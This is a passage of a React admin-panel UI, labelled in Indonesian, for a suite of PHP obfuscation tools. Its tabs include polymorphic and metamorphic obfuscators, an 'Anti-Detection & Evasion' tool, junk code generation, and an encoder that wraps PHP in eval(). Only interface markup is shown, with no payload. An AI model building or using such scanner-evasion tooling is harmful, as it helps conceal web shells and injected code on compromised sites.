                        className="w-full bg-slate-950 border border-slate-800 rounded-lg px-4 py-3 text-slate-100 placeholder-slate-600 focus:outline-none focus:ring-2 focus:ring-emerald-500/40 focus:border-emerald-500 transition font-mono"
                      />
                      <button
                        type="button"
                        onClick={() => setShowPassword(!showPassword)}
                        className="absolute inset-y-0 right-0 px-3 flex items-center text-slate-500 hover:text-slate-300 transition"
                      >
                        {showPassword ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
                      </button>
                    </div>
                  </div>

                  {loginError && (
                    <motion.div
                      initial={{ opacity: 0, y: -5 }}
                      animate={{ opacity: 1, y: 0 }}
                      className="flex items-center space-x-2 bg-red-500/10 border border-red-500/20 text-red-400 px-3 py-2.5 rounded-lg text-sm"
                    >
                      <ShieldAlert className="h-4 w-4 flex-shrink-0" />
                      <span>{loginError}</span>
                    </motion.div>
                  )}

                  <button
                    type="submit"
                    className="w-full bg-emerald-500 hover:bg-emerald-400 text-slate-950 font-bold py-3 px-4 rounded-lg transition-all duration-150 active:scale-[0.99] cursor-pointer shadow-lg shadow-emerald-500/10 flex items-center justify-center space-x-2"
                  >
                    <span>Masuk</span>
                    <Unlock className="h-4 w-4" />
                  </button>
                </form>
              </div>
            </motion.div>
          ) : (
            
            /* MAIN ADMIN INTERFACE */
            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              className="flex-1 grid grid-cols-1 lg:grid-cols-4 gap-8"
            >
              
              {/* SIDEBAR TABS & STATUS PANEL */}
              <div className="space-y-6 lg:col-span-1">                {/* TOOL SCOPE CONTROL */}
                <div className="bg-slate-900/80 border border-slate-800 rounded-xl p-5 backdrop-blur-md">
                  <h3 className="text-sm font-bold text-slate-300 uppercase tracking-wider mb-4 flex items-center justify-between">
                    <span>Sesi Admin</span>
                    <Shield className="h-4 w-4 text-emerald-400" />
                  </h3>
                  
                  <div className="space-y-3 text-xs">
                    <div className="p-3 rounded-lg bg-emerald-500/10 border border-emerald-500/20 text-emerald-400">
                      <div className="font-semibold text-white flex items-center gap-1.5 mb-1">
                        <UserCheck className="h-4 w-4" />
                        <span>Sesi Aktif</span>
                      </div>
                      <p className="text-[11px] text-slate-300 leading-relaxed font-mono">
                        Seluruh alat di dalam panel admin ini telah berhasil dibuka dan siap digunakan!
                      </p>
                    </div>

                    <div className="p-2.5 rounded-lg bg-slate-950 border border-slate-800/60 font-mono text-[11px] text-slate-400">
                      <div className="flex items-center justify-between">
                        <span>Sesi Admin</span>
                        <span className="text-emerald-400 font-bold flex items-center gap-1">● AKTIF</span>
                      </div>
                    </div>
                  </div>
                </div>
                {/* NAVIGATION TABS */}
                <div className="bg-slate-900/80 border border-slate-800 rounded-xl p-3 backdrop-blur-md flex flex-col space-y-1">
                  <h3 className="text-xs font-bold text-slate-500 uppercase tracking-widest px-3 pt-2 pb-3">
                    Menu Utama
                  </h3>

                  {/* TAB 1 */}
                  <button
                    onClick={() => setActiveTab('obfuscator')}
                    className={`flex items-center justify-between px-3 py-2.5 rounded-lg text-left text-xs font-medium tracking-wide transition cursor-pointer ${
                      activeTab === 'obfuscator'
                        ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/30'
                        : 'text-slate-300 hover:bg-slate-800/50 hover:text-slate-100 border border-transparent'
                    }`}
                  >
                    <div className="flex items-center space-x-2.5">
                      <FileCode className="h-4 w-4 flex-shrink-0" />
                      <span className="truncate">PHP Obfuscator ↔ Deobf</span>
                    </div>
                  </button>

                  {/* TAB 2 */}
                  <button
                    onClick={() => setActiveTab('rot13')}
                    className={`flex items-center justify-between px-3 py-2.5 rounded-lg text-left text-xs font-medium tracking-wide transition cursor-pointer ${
                      activeTab === 'rot13'
                        ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/30'
                        : 'text-slate-300 hover:bg-slate-800/50 hover:text-slate-100 border border-transparent'
                    }`}
                  >
                    <div className="flex items-center space-x-2.5">
                      <RotateCw className="h-4 w-4 flex-shrink-0" />
                      <span className="truncate">ROT13 Converter (2-Way)</span>
                    </div>
                  </button>

                  {/* TAB 6 */}
                  <button
                    onClick={() => setActiveTab('php_goto')}
                    className={`flex items-center justify-between px-3 py-2.5 rounded-lg text-left text-xs font-medium tracking-wide transition cursor-pointer ${
                      activeTab === 'php_goto'
                        ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/30'
                        : 'text-slate-300 hover:bg-slate-800/50 hover:text-slate-100 border border-transparent'
                    }`}
                  >
                    <div className="flex items-center space-x-2.5">
                      <Sparkles className="h-4 w-4 flex-shrink-0 text-emerald-400" />
                      <span className="truncate">PHP Goto Obfuscator</span>
                    </div>
                  </button>

                  {/* TAB 3 */}
                  <button
                    onClick={() => setActiveTab('url_b64_22')}
                    className={`flex items-center justify-between px-3 py-2.5 rounded-lg text-left text-xs font-medium tracking-wide transition cursor-pointer ${
                      activeTab === 'url_b64_22'
                        ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/30'
                        : 'text-slate-300 hover:bg-slate-800/50 hover:text-slate-100 border border-transparent'
                    }`}
                  >
                    <div className="flex items-center space-x-2.5">
                      <Link className="h-4 w-4 flex-shrink-0" />
                      <span className="truncate">URL ↔ Base64 (gacor22)</span>
                    </div>
                  </button>

                  {/* TAB 4 */}
                  <button
                    onClick={() => setActiveTab('url_b64_44')}
                    className={`flex items-center justify-between px-3 py-2.5 rounded-lg text-left text-xs font-medium tracking-wide transition cursor-pointer ${
                      activeTab === 'url_b64_44'
                        ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/30'
                        : 'text-slate-300 hover:bg-slate-800/50 hover:text-slate-100 border border-transparent'
                    }`}
                  >
                    <div className="flex items-center space-x-2.5">
                      <Link className="h-4 w-4 flex-shrink-0" />
                      <span className="truncate">URL ↔ Base64 (gacor44)</span>
                    </div>
                  </button>

                  {/* TAB 5 */}
                  <button
                    onClick={() => setActiveTab('url_encoder')}
                    className={`flex items-center justify-between px-3 py-2.5 rounded-lg text-left text-xs font-medium tracking-wide transition cursor-pointer ${
                      activeTab === 'url_encoder'
                        ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/30'
                        : 'text-slate-300 hover:bg-slate-800/50 hover:text-slate-100 border border-transparent'
                    }`}
                  >
                    <div className="flex items-center space-x-2.5">
                      <Code className="h-4 w-4 flex-shrink-0" />
                      <span className="truncate">URL Base64 Encoder (only)</span>
                    </div>
                  </button>

                  <div className="h-px bg-slate-800/60 my-2" />

                  {/* TAB 7: PHP OCTAL */}
                  <button
                    onClick={() => setActiveTab('php_octal')}
                    className={`flex items-center justify-between px-3 py-2.5 rounded-lg text-left text-xs font-medium tracking-wide transition cursor-pointer ${
                      activeTab === 'php_octal'
                        ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/30'
                        : 'text-slate-300 hover:bg-slate-800/50 hover:text-slate-100 border border-transparent'
                    }`}
                  >
                    <div className="flex items-center space-x-2.5">
                      <Terminal className="h-4 w-4 flex-shrink-0 text-amber-500" />
                      <span className="truncate">PHP Octal Obfuscator</span>
                    </div>
                  </button>

                  {/* TAB 8: PHP XOR */}
                  <button
                    onClick={() => setActiveTab('php_xor')}
                    className={`flex items-center justify-between px-3 py-2.5 rounded-lg text-left text-xs font-medium tracking-wide transition cursor-pointer ${
                      activeTab === 'php_xor'
                        ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/30'
                        : 'text-slate-300 hover:bg-slate-800/50 hover:text-slate-100 border border-transparent'
                    }`}
                  >
                    <div className="flex items-center space-x-2.5">
                      <Key className="h-4 w-4 flex-shrink-0 text-cyan-400" />
                      <span className="truncate">PHP XOR Encryptor</span>
                    </div>
                  </button>

                  {/* TAB 9: PHP AES */}
                  <button
                    onClick={() => setActiveTab('php_aes')}
                    className={`flex items-center justify-between px-3 py-2.5 rounded-lg text-left text-xs font-medium tracking-wide transition cursor-pointer ${
                      activeTab === 'php_aes'
                        ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/30'
                        : 'text-slate-300 hover:bg-slate-800/50 hover:text-slate-100 border border-transparent'
                    }`}
                  >
                    <div className="flex items-center space-x-2.5">
                      <Lock className="h-4 w-4 flex-shrink-0 text-indigo-400" />
                      <span className="truncate">PHP AES-256-CBC</span>
                    </div>
                  </button>

                  {/* TAB 10: PHP CHACHA20 */}
                  <button
                    onClick={() => setActiveTab('php_chacha20')}
                    className={`flex items-center justify-between px-3 py-2.5 rounded-lg text-left text-xs font-medium tracking-wide transition cursor-pointer ${
                      activeTab === 'php_chacha20'
                        ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/30'
                        : 'text-slate-300 hover:bg-slate-800/50 hover:text-slate-100 border border-transparent'
                    }`}
                  >
                    <div className="flex items-center space-x-2.5">
                      <Sparkles className="h-4 w-4 flex-shrink-0 text-emerald-400 animate-pulse" />
                      <span className="truncate">PHP ChaCha20 Encryptor</span>
                    </div>
                  </button>

                  <div className="h-px bg-slate-800/60 my-2" />

                  {/* TAB 11: PHP BASE64 */}
                  <button
                    onClick={() => setActiveTab('php_base64')}
                    className={`flex items-center justify-between px-3 py-2.5 rounded-lg text-left text-xs font-medium tracking-wide transition cursor-pointer ${
                      activeTab === 'php_base64'
                        ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/30'
                        : 'text-slate-300 hover:bg-slate-800/50 hover:text-slate-100 border border-transparent'
                    }`}
                  >
                    <div className="flex items-center space-x-2.5">
                      <Code className="h-4 w-4 flex-shrink-0 text-yellow-400" />
                      <span className="truncate">PHP Base64 Obfuscator</span>
                    </div>
                  </button>

                  {/* TAB 12: PHP SHORTENER */}
                  <button
                    onClick={() => setActiveTab('php_shortener')}
                    className={`flex items-center justify-between px-3 py-2.5 rounded-lg text-left text-xs font-medium tracking-wide transition cursor-pointer ${
                      activeTab === 'php_shortener'
                        ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/30'
                        : 'text-slate-300 hover:bg-slate-800/50 hover:text-slate-100 border border-transparent'
                    }`}
                  >
                    <div className="flex items-center space-x-2.5">
                      <Shrink className="h-4 w-4 flex-shrink-0 text-emerald-400" />
                      <span className="truncate">PHP Script Shortener</span>
                    </div>
                  </button>

                  <div className="h-px bg-slate-800/60 my-2" />
                  <h3 className="text-xs font-bold text-slate-500 uppercase tracking-widest px-3 pt-1 pb-2">
                    Fitur Lanjutan (idoseo)
                  </h3>

                  {/* TAB 13: PHP IMAGE OBFUSCATOR */}
                  <button
                    onClick={() => setActiveTab('php_image_obfuscator')}
                    className={`flex items-center justify-between px-3 py-2.5 rounded-lg text-left text-xs font-medium tracking-wide transition cursor-pointer ${
                      activeTab === 'php_image_obfuscator'
                        ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/30'
                        : 'text-slate-300 hover:bg-slate-800/50 hover:text-slate-100 border border-transparent'
                    }`}
                  >
                    <div className="flex items-center space-x-2.5">
                      <Image className="h-4 w-4 flex-shrink-0 text-blue-400" />
                      <span className="truncate">PHP Obfuscator Gambar</span>
                    </div>
                  </button>

                  {/* TAB 14: PHP POLYMORPHIC */}
                  <button
                    onClick={() => setActiveTab('php_polymorphic')}
                    className={`flex items-center justify-between px-3 py-2.5 rounded-lg text-left text-xs font-medium tracking-wide transition cursor-pointer ${
                      activeTab === 'php_polymorphic'
                        ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/30'
                        : 'text-slate-300 hover:bg-slate-800/50 hover:text-slate-100 border border-transparent'
                    }`}
                  >
                    <div className="flex items-center space-x-2.5">
                      <Shuffle className="h-4 w-4 flex-shrink-0 text-amber-400" />
                      <span className="truncate">Polymorphic Obfuscator</span>
                    </div>
                  </button>

                  {/* TAB 15: PHP METAMORPHIC */}
                  <button
                    onClick={() => setActiveTab('php_metamorphic')}
                    className={`flex items-center justify-between px-3 py-2.5 rounded-lg text-left text-xs font-medium tracking-wide transition cursor-pointer ${
                      activeTab === 'php_metamorphic'
                        ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/30'
                        : 'text-slate-300 hover:bg-slate-800/50 hover:text-slate-100 border border-transparent'
                    }`}
                  >
                    <div className="flex items-center space-x-2.5">
                      <Sparkles className="h-4 w-4 flex-shrink-0 text-purple-400" />
                      <span className="truncate">Metamorphic Obfuscator</span>
                    </div>
                  </button>

                  {/* TAB 16: PHP EVASION */}
                  <button
                    onClick={() => setActiveTab('php_evasion')}
                    className={`flex items-center justify-between px-3 py-2.5 rounded-lg text-left text-xs font-medium tracking-wide transition cursor-pointer ${
                      activeTab === 'php_evasion'
                        ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/30'
                        : 'text-slate-300 hover:bg-slate-800/50 hover:text-slate-100 border border-transparent'
                    }`}
                  >
                    <div className="flex items-center space-x-2.5">
                      <Flame className="h-4 w-4 flex-shrink-0 text-red-400 animate-pulse" />
                      <span className="truncate">Anti-Detection & Evasion</span>
                    </div>
                  </button>

                  {/* TAB: PHP JUNK GENERATOR */}
                  <button
                    onClick={() => setActiveTab('php_junk_generator')}
                    className={`flex items-center justify-between px-3 py-2.5 rounded-lg text-left text-xs font-medium tracking-wide transition cursor-pointer ${
                      activeTab === 'php_junk_generator'
                        ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/30'
                        : 'text-slate-300 hover:bg-slate-800/50 hover:text-slate-100 border border-transparent'
                    }`}
                  >
                    <div className="flex items-center space-x-2.5">
                      <Binary className="h-4 w-4 flex-shrink-0 text-emerald-400" />
                      <span className="truncate">PHP Junk Code Generator</span>
                    </div>
                  </button>

                  {/* TAB: STRING CONVERTER */}
                  <button
                    onClick={() => setActiveTab('string_converter')}
                    className={`flex items-center justify-between px-3 py-2.5 rounded-lg text-left text-xs font-medium tracking-wide transition cursor-pointer ${
                      activeTab === 'string_converter'
                        ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/30'
                        : 'text-slate-300 hover:bg-slate-800/50 hover:text-slate-100 border border-transparent'
                    }`}
                  >
                    <div className="flex items-center space-x-2.5">
                      <Hash className="h-4 w-4 flex-shrink-0 text-amber-400" />
                      <span className="truncate">String to Char/Hex</span>
                    </div>
                  </button>

                  <div className="h-px bg-slate-800/60 my-2" />

                  {/* TAB 17: GANTI PASSWORD */}
                  <button
                    onClick={() => setActiveTab('ganti_password')}
                    className={`flex items-center justify-between px-3 py-2.5 rounded-lg text-left text-xs font-medium tracking-wide transition cursor-pointer ${
                      activeTab === 'ganti_password'
                        ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/30'
                        : 'text-slate-300 hover:bg-slate-800/50 hover:text-slate-100 border border-transparent'
                    }`}
                  >
                    <div className="flex items-center space-x-2.5">
                      <Settings className="h-4 w-4 flex-shrink-0 text-emerald-400" />
                      <span className="truncate">Ganti Password Admin</span>
                    </div>
                  </button>
                </div>

                {/* LOGS HISTORY */}
                <div className="bg-slate-900/80 border border-slate-800 rounded-xl p-4 backdrop-blur-md">
                  <h3 className="text-xs font-bold text-slate-400 uppercase tracking-wider mb-3 flex items-center justify-between">
                    <span>LOGS AKTIVITAS</span>
                    <Activity className="h-3.5 w-3.5 text-slate-500" />
                  </h3>
                  
                  <div className="space-y-2 max-h-48 overflow-y-auto pr-1">
                    {history.length === 0 ? (
                      <p className="text-[11px] text-slate-600 italic text-center py-4">Belum ada aktivitas.</p>
                    ) : (
                      history.map((item) => (
                        <div key={item.id} className="p-2 bg-slate-950/80 rounded border border-slate-800/60 font-mono text-[10px] space-y-1">
                          <div className="flex items-center justify-between text-slate-500">
                            <span>[{item.timestamp}]</span>
                            <span className="text-[9px] px-1 py-0.2 bg-emerald-500/10 text-emerald-400 rounded-sm">
                              {item.toolName}
                            </span>
                          </div>
                          <div className="text-slate-300 font-semibold">{item.action}</div>
                          <div className="text-slate-500 truncate italic">In: {item.inputSummary}</div>
                        </div>
                      ))
                    )}
                  </div>
                </div>

              </div>

              {/* TOOL DETAILED CONTAINER */}
              <div className="lg:col-span-3 space-y-6">
                
                {/* CHECK TAB AUTHORIZATION STATUS */}
                {!isTabAccessible(activeTab) ? (
                  <motion.div
                    initial={{ opacity: 0, scale: 0.98 }}
                    animate={{ opacity: 1, scale: 1 }}
                    className="bg-slate-900/80 border border-red-500/20 rounded-2xl p-8 backdrop-blur-md flex flex-col items-center text-center space-y-5"
                  >
                    <div className="bg-red-500/10 p-4 rounded-full border border-red-500/30">
                      <Lock className="h-8 w-8 text-red-400" />
                    </div>
                    <div>
                      <h3 className="text-xl font-bold text-slate-200">Akses Terkunci</h3>
                      <p className="text-sm text-slate-400 max-w-md mx-auto mt-2">
                        Tab ini dilindungi oleh otentikasi scope{' '}
                        <span className="font-mono text-amber-400">
                          {activeTab === 'url_b64_22' ? 'gacor22' : 'gacor44'}
                        </span>
                        . Silakan masukkan password di panel kiri atau switch akun untuk membuka akses.
                      </p>
                    </div>
                  </motion.div>
                ) : (
                  
                  /* ACTIVE TAB COMPONENT */
                  <AnimatePresence mode="wait">
                    
                    {/* TAB 1: PHP OBFUSCATION & DEOBFUSCATION */}
                    {activeTab === 'obfuscator' && (
                      <motion.div
                        key="obfuscator"
                        initial={{ opacity: 0, y: 10 }}
                        animate={{ opacity: 1, y: 0 }}
                        exit={{ opacity: 0, y: -10 }}
                        className="space-y-6"
                      >
                        <div className="bg-slate-900/80 border border-slate-800 rounded-2xl p-6 backdrop-blur-md">
                          <div className="flex items-center justify-between border-b border-slate-800 pb-4 mb-6">
                            <div className="flex items-center space-x-3">
                              <FileCode className="h-5 w-5 text-emerald-400" />
                              <div>
                                <h2 className="text-lg font-bold text-white">PHP Obfuscation & Deobfuscation</h2>
                                <p className="text-xs text-slate-400">Double Base64 Obfuscation formatted in split fragments.</p>
                              </div>
                            </div>
                            <div className="text-xs text-slate-500 font-mono flex items-center space-x-1 bg-slate-950 px-2 py-1 rounded border border-slate-800">
                              <Key className="h-3 w-3 text-emerald-400" />
                              <span>gacor44 Scope</span>
                            </div>
                          </div>

                          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                            
                            {/* OBFUSCATED INPUT COLUMN */}
                            <div className="space-y-2">
                              <div className="flex items-center justify-between">
                                <label className="text-xs font-semibold text-slate-300 uppercase tracking-wider font-mono">
                                  Kode Obfuscated (Input)
                                </label>
                                <div className="flex items-center space-x-2">
                                  {obfInput && (
                                    <button
                                      onClick={() => handleCopy(obfInput, 'obfInput')}
                                      className="text-xs text-slate-400 hover:text-emerald-400 flex items-center space-x-1 bg-slate-950 px-2 py-1 rounded border border-slate-800 hover:border-emerald-500/30 transition cursor-pointer"
                                    >
                                      {copiedId === 'obfInput' ? <Check className="h-3.5 w-3.5 text-emerald-400" /> : <Copy className="h-3.5 w-3.5" />}
                                      <span>{copiedId === 'obfInput' ? 'Disalin' : 'Salin'}</span>
                                    </button>
                                  )}
                                  <button
                                    onClick={() => setObfInput('')}
                                    className="text-xs text-slate-500 hover:text-slate-300 bg-slate-950 px-2 py-1 rounded border border-slate-800 hover:border-slate-700 transition cursor-pointer"
                                  >
                                    Bersihkan
                                  </button>
                                </div>
                              </div>

                              <textarea
                                value={obfInput}
                                onChange={(e) => setObfInput(e.target.value)}
                                placeholder={`$z = "";\n$z .= "WlhK";\n$z .= "eWIz";\n...`}
                                className="w-full h-80 bg-slate-950 border border-slate-800 rounded-lg p-3 text-emerald-400 font-mono text-xs focus:outline-none focus:ring-1 focus:ring-emerald-500 focus:border-emerald-500 placeholder-slate-700 resize-none leading-relaxed"
                              />

                              <button
                                onClick={handleObfuscatedDecode}
                                className="w-full bg-emerald-500/10 hover:bg-emerald-500/20 text-emerald-400 border border-emerald-500/30 font-semibold py-2.5 px-4 rounded-lg transition-all duration-150 active:scale-[0.99] flex items-center justify-center space-x-2 cursor-pointer text-sm"
                              >
                                <Unlock className="h-4 w-4" />
                                <span>Obfuscated → PHP biasa</span>
                              </button>
                            </div>

                            {/* DEOBFUSCATED OUTPUT COLUMN */}
                            <div className="space-y-2">
                              <div className="flex items-center justify-between">
                                <label className="text-xs font-semibold text-slate-300 uppercase tracking-wider font-mono">
                                  Hasil Decode (PHP biasa)
                                </label>
                                <div className="flex items-center space-x-2">
                                  {obfOutput && (
                                    <button
                                      onClick={() => handleCopy(obfOutput, 'obfOutput')}
                                      className="text-xs text-slate-400 hover:text-emerald-400 flex items-center space-x-1 bg-slate-950 px-2 py-1 rounded border border-slate-800 hover:border-emerald-500/30 transition cursor-pointer"
                                    >
                                      {copiedId === 'obfOutput' ? <Check className="h-3.5 w-3.5 text-emerald-400" /> : <Copy className="h-3.5 w-3.5" />}
                                      <span>{copiedId === 'obfOutput' ? 'Disalin' : 'Salin'}</span>
                                    </button>
                                  )}
                                  <button
                                    onClick={() => setObfOutput('')}
                                    className="text-xs text-slate-500 hover:text-slate-300 bg-slate-950 px-2 py-1 rounded border border-slate-800 hover:border-slate-700 transition cursor-pointer"
                                  >
                                    Bersihkan
                                  </button>
                                </div>
                              </div>

                              <textarea
                                value={obfOutput}
                                onChange={(e) => setObfOutput(e.target.value)}
                                placeholder="Hasil PHP murni akan muncul di sini..."
                                className="w-full h-80 bg-slate-950 border border-slate-800 rounded-lg p-3 text-slate-200 font-mono text-xs focus:outline-none focus:ring-1 focus:ring-emerald-500 focus:border-emerald-500 placeholder-slate-700 resize-none leading-relaxed"
                              />

                              <button
                                onClick={handleObfuscatedEncode}
                                className="w-full bg-cyan-500/10 hover:bg-cyan-500/20 text-cyan-400 border border-cyan-500/30 font-semibold py-2.5 px-4 rounded-lg transition-all duration-150 active:scale-[0.99] flex items-center justify-center space-x-2 cursor-pointer text-sm"
                              >
                                <Lock className="h-4 w-4" />
                                <span>PHP biasa → Obfuscated</span>
                              </button>
                            </div>

                          </div>

                          {obfError && (
                            <motion.div
                              initial={{ opacity: 0 }}
                              animate={{ opacity: 1 }}
                              className="mt-6 flex items-center space-x-2 bg-red-500/10 border border-red-500/20 text-red-400 px-3 py-2.5 rounded-lg text-xs font-mono"
                            >
                              <ShieldAlert className="h-4 w-4" />
                              <span>{obfError}</span>
                            </motion.div>
                          )}
                        </div>

                        {/* DOCUMENTATION PANEL */}
                        <div className="bg-slate-900/40 border border-slate-800 rounded-xl p-5 text-xs text-slate-400 space-y-2">
                          <h4 className="font-bold text-slate-300 flex items-center gap-1">
                            <Info className="h-4 w-4 text-emerald-400" />
                            Petunjuk Obfuscation format `$z .= "..."`
                          </h4>
                          <p>
                            Formulir ini mendekode file PHP yang terenkripsi ganda (double-base64) dalam variabel terfragmentasi.
                          </p>
                          <ul className="list-disc list-inside space-y-1 pl-1 text-slate-500 font-mono">
                            <li>Fragmentasi membagi teks base64 menjadi potongan kecil (default 4 karakter).</li>
                            <li>Sistem ini secara otomatis menyaring, merapikan b64 string, dan memproses urutan dekode.</li>
                            <li>Encoder akan menghasilkan file PHP wrapper lengkap dengan fungsi <code className="text-amber-500">eval()</code> murni.</li>
                          </ul>
                        </div>
                      </motion.div>
                    )}

                    {/* TAB 2: ROT13 CONVERTER (2-WAY) */}
                    {activeTab === 'rot13' && (
                      <motion.div
                        key="rot13"
                        initial={{ opacity: 0, y: 10 }}
                        animate={{ opacity: 1, y: 0 }}
                        exit={{ opacity: 0, y: -10 }}
                        className="space-y-6"
                      >
                        <div className="bg-slate-900/80 border border-slate-800 rounded-2xl p-6 backdrop-blur-md">
                          <div className="flex items-center justify-between border-b border-slate-800 pb-4 mb-6">
                            <div className="flex items-center space-x-3">
                              <RotateCw className="h-5 w-5 text-emerald-400" />
                              <div>
                                <h2 className="text-lg font-bold text-white">ROT13 Converter (2 Arah)</h2>
                                <p className="text-xs text-slate-400">Enkripsi & Dekripsi ROT13 simetris untuk URL atau teks biasa.</p>
                              </div>
                            </div>
                            <div className="text-xs text-slate-500 font-mono flex items-center space-x-1 bg-slate-950 px-2 py-1 rounded border border-slate-800">
                              <Key className="h-3 w-3 text-emerald-400" />
                              <span>gacor44 Scope</span>
                            </div>
                          </div>

                          <form onSubmit={handleRot13Submit} className="space-y-5">
                            <div className="space-y-2">
                              <label className="block text-xs font-semibold text-slate-300 uppercase tracking-wider font-mono">
                                Masukkan URL / Teks:
                              </label>
                              <textarea
                                value={rotInput}
                                onChange={(e) => setRotInput(e.target.value)}
                                placeholder="Contoh: https://google.com atau text biasa..."
                                className="w-full h-24 bg-slate-950 border border-slate-800 rounded-lg p-3 text-emerald-400 font-mono text-sm focus:outline-none focus:ring-1 focus:ring-emerald-500 focus:border-emerald-500"
                              />
                            </div>

                            <button
                              type="submit"
                              className="w-full bg-emerald-500/10 hover:bg-emerald-500/20 text-emerald-400 border border-emerald-500/30 font-semibold py-2.5 px-4 rounded-lg transition-all duration-150 active:scale-[0.99] flex items-center justify-center space-x-2 cursor-pointer text-sm"
                            >
                              <RotateCw className="h-4 w-4 animate-spin-slow" />
                              <span>Convert ROT13</span>
                            </button>
                          </form>

                          {rotOutput !== '' && (
                            <motion.div
                              initial={{ opacity: 0, y: 5 }}
                              animate={{ opacity: 1, y: 0 }}
                              className="mt-6 pt-6 border-t border-slate-800/80 space-y-2"
                            >
                              <div className="flex items-center justify-between">
                                <h3 className="text-xs font-semibold text-slate-300 uppercase tracking-wider font-mono">
                                  Hasil Konversi:
                                </h3>
                                <button
                                  onClick={() => handleCopy(rotOutput, 'rotOutput')}
                                  className="text-xs text-slate-400 hover:text-emerald-400 flex items-center space-x-1 bg-slate-950 px-2 py-1 rounded border border-slate-800 hover:border-emerald-500/30 transition cursor-pointer"
                                >
                                  {copiedId === 'rotOutput' ? <Check className="h-3.5 w-3.5 text-emerald-400" /> : <Copy className="h-3.5 w-3.5" />}
                                  <span>{copiedId === 'rotOutput' ? 'Disalin' : 'Salin'}</span>
                                </button>
                              </div>
                              <textarea
                                readOnly
                                value={rotOutput}
                                className="w-full h-24 bg-slate-950 border border-slate-800 rounded-lg p-3 text-slate-100 font-mono text-sm focus:outline-none"
                              />
                            </motion.div>
                          )}
                        </div>

                        <div className="bg-slate-900/40 border border-slate-800 rounded-xl p-5 text-xs text-slate-400">
                          <p className="flex items-center gap-1 text-slate-300 font-bold mb-1">
                            <Info className="h-4 w-4 text-emerald-400" />
                            Cara Kerja ROT13
                          </p>
                          <p className="text-slate-500">
                            ROT13 menggeser setiap huruf alfabet sebanyak 13 langkah (mis. A menjadi N, B menjadi O). Karena alfabet memiliki 26 huruf, menjalankan ROT13 pada teks terenkripsi akan mengembalikan teks asli secara langsung!
                          </p>
                        </div>
                      </motion.div>
                    )}

                    {/* TAB 3: URL ↔ Base64 (gacor22) */}
                    {activeTab === 'url_b64_22' && (
                      <motion.div
                        key="url_b64_22"
                        initial={{ opacity: 0, y: 10 }}
                        animate={{ opacity: 1, y: 0 }}
                        exit={{ opacity: 0, y: -10 }}
                        className="space-y-6"
                      >
                        <div className="bg-slate-900/80 border border-slate-800 rounded-2xl p-6 backdrop-blur-md">
                          <div className="flex items-center justify-between border-b border-slate-800 pb-4 mb-6">
                            <div className="flex items-center space-x-3">
                              <Link className="h-5 w-5 text-emerald-400" />
                              <div>
                                <h2 className="text-lg font-bold text-white">🔐 URL ↔ Base64 Converter (gacor22)</h2>
                                <p className="text-xs text-slate-400">Konverter dua arah dari URL murni ke Base64 dan sebaliknya.</p>
                              </div>
                            </div>
                            <div className="text-xs text-amber-500 font-mono flex items-center space-x-1 bg-slate-950 px-2 py-1 rounded border border-slate-850">
                              <Key className="h-3 w-3" />
                              <span>gacor22 Scope</span>
                            </div>
                          </div>

                          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                            
                            {/* URL TO BASE64 SECTION */}
                            <div className="bg-slate-950/60 p-5 rounded-xl border border-slate-800/80 space-y-4">
                              <span className="text-xs font-bold text-slate-400 uppercase tracking-wider block font-mono">
                                🟢 URL ke Base64
                              </span>
                              <div className="space-y-2">
                                <input
                                  type="text"
                                  value={urlInput22}
                                  onChange={(e) => setUrlInput22(e.target.value)}
                                  placeholder="Masukkan URL (mis. https://google.com)"
                                  className="w-full bg-slate-950 border border-slate-800 rounded-lg px-3 py-2 text-slate-200 font-mono text-xs focus:outline-none focus:border-emerald-500"
                                />
                                <button
                                  onClick={handleUrlEncode22}
                                  className="w-full bg-emerald-500 hover:bg-emerald-400 text-slate-950 font-semibold py-2 px-4 rounded-lg transition text-xs cursor-pointer"
                                >
                                  URL → Base64
                                </button>
                              </div>

                              {outputB64_22 && (
                                <motion.div
                                  initial={{ opacity: 0 }}
                                  animate={{ opacity: 1 }}
                                  className="space-y-1.5"
                                >
                                  <div className="flex items-center justify-between">
                                    <span className="text-[10px] text-slate-500 font-mono">Hasil Base64:</span>
                                    <button
                                      onClick={() => handleCopy(outputB64_22, 'outputB64_22')}
                                      className="text-[10px] text-slate-400 hover:text-emerald-400 flex items-center gap-0.5"
                                    >
                                      {copiedId === 'outputB64_22' ? <Check className="h-3 w-3 text-emerald-400" /> : <Copy className="h-3 w-3" />}
                                      <span>Disalin</span>
                                    </button>
                                  </div>
                                  <textarea
                                    readOnly
                                    value={outputB64_22}
                                    className="w-full h-16 bg-slate-950 border border-slate-800 rounded-lg p-2 text-[11px] text-slate-300 font-mono focus:outline-none resize-none"
                                  />
                                </motion.div>
                              )}
                            </div>

                            {/* BASE64 TO URL SECTION */}
                            <div className="bg-slate-950/60 p-5 rounded-xl border border-slate-800/80 space-y-4">
                              <span className="text-xs font-bold text-slate-400 uppercase tracking-wider block font-mono">
                                🔵 Base64 ke URL
                              </span>
                              <div className="space-y-2">
                                <textarea
                                  value={b64Input22}
                                  onChange={(e) => setB64Input22(e.target.value)}
                                  placeholder="Masukkan string Base64 di sini..."
                                  className="w-full h-10 bg-slate-950 border border-slate-800 rounded-lg p-2 text-slate-200 font-mono text-xs focus:outline-none focus:border-emerald-500 resize-none"
                                />
                                <button
